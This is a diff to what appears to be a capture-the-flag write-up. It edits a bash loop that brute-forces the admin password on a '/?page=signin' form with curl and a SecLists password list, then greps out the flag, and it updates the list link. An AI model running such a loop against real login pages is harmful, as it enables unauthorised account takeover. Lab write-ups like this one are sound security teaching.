@@ -29,7 +29,7 @@ The login form at `/?page=signin` is vulnerable to brute force attacks, allowing
 - Use this brute force loop:
   ```bash
   for pwd in $(cat pwdlist.txt); do 
-  resp=$(curl -s "http://{IP_ADDRESS}/?page=signin&username=admin&password=$pwd&Login=Login")
+  resp=$(curl -s "http://IP_ADDRESS/?page=signin&username=admin&password=$pwd&Login=Login")
   if [[ "$resp" == *"The flag is :"* ]]; then 
     flag=$(echo "$resp" | grep -oP 'The flag is : \K[a-f0-9]{64}')
     echo "Success! Username: admin | Password: $pwd | Flag: $flag"
@@ -64,4 +64,4 @@ done
 ## Resources
 
 - Password list source:  
-  [https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt)
+  [https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt)
